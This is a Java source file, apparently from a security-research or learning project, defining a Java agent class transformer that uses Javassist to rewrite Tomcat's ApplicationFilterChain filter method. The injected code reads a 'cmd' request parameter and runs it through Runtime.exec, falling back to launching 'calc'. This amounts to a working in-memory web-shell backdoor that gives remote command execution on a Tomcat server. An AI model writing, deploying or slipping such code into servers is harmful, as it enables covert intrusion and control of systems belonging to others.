package Seri.JVMAgentChangeBytecode;

import javassist.*;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class Hello_Transform implements ClassFileTransformer {

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try{
            ClassPool classPool = ClassPool.getDefault();

            if (classBeingRedefined != null) {
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                classPool.insertClassPath(ccp);
            }

            CtClass ctClass = classPool.getCtClass("org.apache.catalina.core.ApplicationFilterChain");
            CtMethod ctMethod = ctClass.getDeclaredMethod("internalDoFilter");

            String body =

                    "javax.servlet.http.HttpServletRequest request = $1\n;" +

                            "String cmd=request.getParameter(\"cmd\");\n" +

                            "if (cmd != null){\n" +

                            "  java.lang.Runtime.getRuntime().exec(cmd);\n" +

                            "  } else {java.lang.Runtime.getRuntime().exec(\"calc\");};";
            ctMethod.insertBefore(body);
//            ctMethod.setBody(body);
            ctClass.writeFile();

            byte[] byteCode = ctClass.toBytecode();
            return byteCode;


        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
